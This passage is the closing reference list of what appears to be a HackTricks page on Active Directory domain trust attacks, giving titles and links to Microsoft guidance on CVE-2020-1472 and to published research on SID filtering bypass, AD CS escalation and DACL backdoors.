- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
